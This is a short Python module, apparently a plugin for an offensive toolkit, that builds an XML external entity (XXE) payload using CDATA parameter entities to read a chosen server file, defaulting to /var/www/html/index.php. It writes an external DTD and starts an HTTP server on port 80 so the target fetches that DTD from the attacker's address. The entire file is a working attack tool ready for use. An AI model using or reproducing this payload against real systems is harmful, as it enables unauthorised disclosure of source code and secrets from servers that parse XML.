import subprocess
from pathlib import Path

from core.attacker import get_ip


NAME = "xxe.cdata"
DESCRIPTION = "Generate XXE CDATA payloads for advanced file disclosure."


G = "\033[92m"
C = "\033[96m"
B = "\033[94m"
Y = "\033[93m"
R = "\033[91m"
M = "\033[95m"
W = "\033[0m"
BOLD = "\033[1m"


DTD = """<!ENTITY joined "%begin;%file;%end;">"""


def print_payload(title, payload):
    print(f"\n{G}[+] {title}{W}")
    print(payload)


def get_file():

    path = input(f"{Y}File [/var/www/html/index.php]>{W} ").strip()

    return path or "/var/www/html/index.php"


def create_dtd():

    dtd = Path("xxe.dtd")
    dtd.write_text(DTD)

    return dtd


def start_http_server():
    try:
        subprocess.Popen(
            [
                "x-terminal-emulator",
                "-e",
                "python3 -m http.server 80",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        return True

    except Exception:
        return False


def run(data, cred, args):

    ip = get_ip()
    path = get_file()

    dtd = create_dtd()
    server = start_http_server()

    payload = f"""<?xml version="1.0"?>
<!DOCTYPE email [
<!ENTITY % begin "<![CDATA[">
<!ENTITY % file SYSTEM "file://{path}">
<!ENTITY % end "]]>">
<!ENTITY % xxe SYSTEM "http://{ip}:80/{dtd.name}">
%xxe;
]>
<root>
    <name></name>
    <tel></tel>
    <email>&joined;</email>
    <message></message>
</root>"""

    print_payload("CDATA File Disclosure", payload)

    print(f"\n{G}[+] External DTD{W}")
    print(dtd.resolve())

    if server:
        print(f"\n{G}[+] HTTP Server Started{W}")
        print(f"http://{ip}:80/{dtd.name}")
    else:
        print(f"\n{R}[-] Failed to start HTTP server.{W}")
        print("Run manually:")
        print("python3 -m http.server 80")
